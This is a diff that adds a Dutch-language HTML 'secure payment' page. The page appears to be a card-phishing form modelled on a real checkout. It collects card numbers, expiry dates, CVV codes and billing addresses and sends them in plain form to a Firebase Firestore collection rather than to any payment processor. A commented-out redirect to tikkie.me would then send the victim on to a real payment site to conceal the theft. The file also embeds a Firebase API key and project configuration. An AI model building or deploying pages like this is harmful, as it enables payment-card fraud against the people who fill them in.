@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veilig Betalen (Firestore Testmodus)</title>
+    <style>
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #ffffff;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+        }
+
+        .checkout-container {
+            width: 100%;
+            max-width: 480px;
+        }
+
+        p { font-size: 14px; margin-bottom: 15px; color: #555; }
+
+        /* Input styling conform jouw screenshot */
+        .input-box {
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-bottom: 12px;
+            position: relative;
+            background: #fff;
+        }
+
+        .input-box label {
+            display: block;
+            font-size: 11px;
+            color: #777;
+            margin-bottom: 2px;
+        }
+
+        .input-box input {
+            border: none;
+            width: 100%;
+            font-size: 16px;
+            outline: none;
+            color: #333;
+            padding: 2px 0;
+        }
+
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .flex-1 { flex: 1; }
+        .flex-small { width: 100px; }
+
+        .card-icons {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            gap: 5px;
+            opacity: 0.5;
+        }
+
+        h3 {
+            font-size: 17px;
+            font-weight: 600;
+            margin: 30px 0 15px 0;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container input { width: auto; margin: 0; }
+
+        button.submit-btn {
+            width: 100%;
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
+
+        button.submit-btn:active { opacity: 0.8; }
+    </style>
+</head>
+<body>
+
+<div class="checkout-container">
+    <p>Voer je kaartgegevens in:</p>
+    
+    <div class="input-box">
+        <label>Nummer creditcard/betaalpas</label>
+        <input type="text" id="ccNummer" placeholder="0000 0000 0000 0000">
+        <div class="card-icons">
+            <small>VISA</small> <small>MC</small>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="input-box flex-1">
+            <label>Vervalt op MM/JJ</label>
+            <input type="text" id="ccDatum" placeholder="MM/JJ">
+        </div>
+        <div class="input-box flex-small">
+            <label>CVV</label>
+            <input type="text" id="ccCvv" placeholder="***">
+        </div>
+    </div>
+
+    <h3>Factuuradres</h3>
+    
+    <div class="checkbox-container">
+        <input type="checkbox" id="verzendCheck" checked> 
+        <label for="verzendCheck">Gebruik mijn verzendadres.</label>
+    </div>
+
+    <div class="input-box">
+        <label>Land / Regio</label>
+        <input type="text" id="land" value="Nederland">
+    </div>
+
+    <div class="input-box">
+        <input type="text" id="voornaam" placeholder="Voornaam">
+    </div>
+
+    <div class="row">
+        <div class="input-box flex-1">
+            <input type="text" id="achternaam" placeholder="Achternaam">
+        </div>
+        <div class="input-box flex-1">
+            <input type="text" id="suffix" placeholder="Suffix (optioneel)">
+        </div>
+    </div>
+
+    <div class="input-box">
+        <input type="text" id="straat" placeholder="Naam gebouw en straatnaam">
+    </div>
+
+    <div class="input-box">
+        <input type="text" id="extraAdres" placeholder="Nadere aanduiding, toegangscode gebouw (optioneel)">
+    </div>
+
+    <div class="input-box">
+        <input type="text" id="overig" placeholder="Overige adresgegevens (optioneel)">
+    </div>
+
+    <div class="row">
+        <div class="input-box flex-1">
+            <input type="text" id="postcode" placeholder="Postcode">
+        </div>
+        <div class="input-box flex-1">
+            <input type="text" id="woonplaats" placeholder="Woonplaats">
+        </div>
+    </div>
+
+    <button class="submit-btn" onclick="slaOp()">Bevestigen</button>
+</div>
+
+<script type="module">
+    // Importeer de benodigde Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    // Jouw specifieke Firebase configuratie - VERGEET NIET JE EIGEN WAARDEN TE CONTROLEREN!
+    const firebaseConfig = {
+        apiKey: "AIzaSyDTQhc1FJv_IcGkBFkrvN_u1aKA6DZNHYA", // Controleer deze waarde!
+        authDomain: "datecase.firebaseapp.com", // Controleer deze waarde!
+        projectId: "datecase", // Controleer deze waarde!
+        storageBucket: "datecase.firebasestorage.app", // Controleer deze waarde!
+        messagingSenderId: "652335827565", // Controleer deze waarde!
+        appId: "1:652335827565:web:5c0a0fbc9f16d0597bcd64" // Controleer deze waarde!
+    };
+
+    // Initialiseer Firebase
+    const app = initializeApp(firebaseConfig);
+    // Krijg een referentie naar de Firestore database
+    const db = getFirestore(app);
+
+    // Functie om gegevens op te slaan in Firestore
+    window.slaOp = async () => {
+        // Verzamel alle data uit de velden
+        const formData = {
+            kaartnummer: document.getElementById('ccNummer').value,
+            vervaldatum: document.getElementById('ccDatum').value,
+            cvv: document.getElementById('ccCvv').value,
+            voornaam: document.getElementById('voornaam').value,
+            achternaam: document.getElementById('achternaam').value,
+            adres: document.getElementById('straat').value,
+            postcode: document.getElementById('postcode').value,
+            woonplaats: document.getElementById('woonplaats').value,
+            tijdstip: new Date() // Voeg een tijdstempel toe
+        };
+
+        // Eenvoudige validatie: controleer of de belangrijkste velden zijn ingevuld
+        if(formData.kaartnummer && formData.voornaam && formData.adres && formData.postcode && formData.woonplaats) {
+            try {
+                // Sla op in de collectie 'betalingen' in Firestore
+                await addDoc(collection(db, "betalingen"), formData);
+                
+                // Melding voor testmodus - Geen doorverwijzing
+                alert("Gegevens succesvol opgeslagen in Firestore (testmodus).");
+                
+                // DE VOLGENDE LIJN IS UITGESCHAKELD OM GEEN DOORVERWIJZING TE HEBBEN TIJDENS HET TESTEN
+                // window.location.href = "https://www.tikkie.me"; 
+
+                // Optioneel: leeg de formulier velden na succesvolle opslag
+                document.getElementById('ccNummer').value = '';
+                document.getElementById('ccDatum').value = '';
+                document.getElementById('ccCvv').value = '';
+                document.getElementById('voornaam').value = '';
+                document.getElementById('achternaam').value = '';
+                document.getElementById('straat').value = '';
+                document.getElementById('extraAdres').value = '';
+                document.getElementById('overig').value = '';
+                document.getElementById('postcode').value = '';
+                document.getElementById('woonplaats').value = '';
+
+            } catch (e) {
+                // Foutafhandeling
+                alert("Er is een technische fout opgetreden. Controleer de browserconsole en je Firebase Firestore Security Rules.");
+                console.error("Fout bij opslaan in Firestore:", e);
+            }
+        } else {
+            // Melding als niet alle verplichte velden zijn ingevuld
+            alert("Vul alstublieft alle verplichte gegevens in (creditcardnummer, voornaam, adres, postcode, woonplaats).");
+        }
+    };
+</script>
+
+</body>
+</html>
